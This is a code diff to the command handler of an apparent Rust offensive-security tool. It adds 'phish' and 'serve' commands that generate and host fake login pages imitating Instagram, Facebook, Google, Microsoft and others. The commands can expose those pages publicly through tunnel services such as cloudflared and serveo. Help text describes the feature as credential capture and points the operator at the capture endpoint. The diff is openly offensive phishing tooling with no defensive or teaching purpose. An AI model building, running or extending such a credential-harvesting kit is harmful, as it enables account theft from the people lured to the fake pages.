@@ -177,34 +177,81 @@ fn process_shell_command(input: &str) {
         "phish" | "phishing" => {
             let parts: Vec<&str> = args_str.split_whitespace().collect();
             if parts.is_empty() {
-                banner::error("Usage: phish serve <template> [--local <port>] [--tunnel <type>]");
+                banner::error("Usage: phish serve <template> [--tunnel <type>] [--port <port>]");
+                banner::info("Templates: login, instagram, facebook, google, microsoft, etc.");
+                banner::info("Tunnels: cloudflared, localtunnel, serveo");
                 return;
             }
-            match parts.get(1) {
-                Some(&"serve") | Some(&"s") => {
-                    let template = parts.get(2).map(|s| s.to_string()).unwrap_or("login".to_string());
-                    let port = 8080;
-                    let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
-                    if parts.iter().any(|&p| p == "--local") {
-                        // local only
-                    }
+            let subcommand = parts[0];
+            match subcommand {
+                "serve" | "s" => {
+                    let template = parts.get(1).map(|s| s.to_string()).unwrap_or("login".to_string());
+                    let mut port: u16 = 8080;
+                    let mut tunnel: Option<String> = None;
                     for (i, p) in parts.iter().enumerate() {
                         if *p == "--tunnel" && i + 1 < parts.len() {
-                            server = server.with_tunnel(parts[i + 1]);
+                            tunnel = Some(parts[i + 1].to_string());
+                        }
+                        if *p == "--port" && i + 1 < parts.len() {
+                            port = parts[i + 1].parse().unwrap_or(8080);
                         }
                     }
+                    let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
+                    if let Some(t) = tunnel {
+                        server = server.with_tunnel(&t);
+                    }
+                    banner::info(&format!("Starting phishing server with template '{}' on port {}", template, port));
                     let _ = server.start();
                 }
+                "template" | "t" => {
+                    let template = parts.get(1).map(|s| s.to_string()).unwrap_or("login".to_string());
+                    let gen = crate::phishing::PhishingGen::new();
+                    match gen.generate(&template, "0.0.0.0", "8080", None) {
+                        Some(path) => {
+                            banner::success(&format!("Phishing page generated: {}", path));
+                            banner::info("Host with: python3 -m http.server 8080");
+                            banner::info("Capture at: http://0.0.0.0:8080/capture (use phish serve instead)");
+                        }
+                        None => banner::error(&format!("Unknown template: {}. Use list-templates", template)),
+                    }
+                }
                 _ => {
-                    banner::error("Usage: phish serve <template> [--local <port>] [--tunnel <type>]");
+                    // Try as template name directly: "phish instagram"
+                    let template = subcommand.to_string();
+                    let gen = crate::phishing::PhishingGen::new();
+                    match gen.generate(&template, "0.0.0.0", "8080", None) {
+                        Some(path) => {
+                            banner::success(&format!("Phishing page generated: {}", path));
+                            banner::info(&format!("To capture credentials, run: phish serve {}", template));
+                        }
+                        None => banner::error(&format!("Unknown template: {}. Use list-templates to see available.", template)),
+                    }
                 }
             }
         }
         "serve" => {
             let parts: Vec<&str> = args_str.split_whitespace().collect();
-            let template = parts.first().map(|s| s.to_string()).unwrap_or("login".to_string());
-            let port: u16 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(8080);
-            let server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
+            if parts.is_empty() {
+                banner::info("Phishing server - credential capture with powers");
+                banner::info("Usage: serve <template> [--port <port>] [--tunnel <type>]");
+                banner::info("Templates: login, instagram, facebook, google, etc. (see list-templates)");
+                return;
+            }
+            let template = parts[0].to_string();
+            let mut port: u16 = 8080;
+            let mut tunnel: Option<String> = None;
+            for (i, p) in parts.iter().enumerate() {
+                if *p == "--tunnel" && i + 1 < parts.len() {
+                    tunnel = Some(parts[i + 1].to_string());
+                }
+                if *p == "--port" && i + 1 < parts.len() {
+                    port = parts[i + 1].parse().unwrap_or(8080);
+                }
+            }
+            let mut server = crate::phishing::PhishingServer::new("0.0.0.0", port, &template);
+            if let Some(t) = tunnel {
+                server = server.with_tunnel(&t);
+            }
             let _ = server.start();
         }
         "tui" => {
